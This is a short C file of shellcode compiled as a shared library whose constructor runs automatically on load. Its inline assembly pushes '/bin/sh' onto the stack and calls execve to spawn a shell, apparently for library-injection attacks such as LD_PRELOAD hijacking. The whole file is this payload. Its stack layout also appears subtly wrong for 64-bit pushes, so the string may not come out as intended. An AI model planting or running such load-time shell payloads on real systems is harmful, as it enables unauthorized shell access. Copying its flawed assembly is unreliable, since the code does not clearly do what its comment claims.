// gcc -fPIC -shared shellcode1.c -Os && strip a.out
__attribute__((constructor))
void f(void) {
/*
>>> import struct
>>> struct.unpack('<II', '/bin/sh\x00')
(1852400175, 6845231)
*/
    asm(
        "push 6845231\n"
        "push 1852400175\n"
        "mov %rsp, %rdi\n"
        "xor %rsi, %rsi\n"
        "xor %rdx, %rdx\n"
        "xor %rax, %rax\n"
        "mov $59, %al\n"
        "syscall\n"
        "inf:\n"
        "jmp inf\n"
    );
}
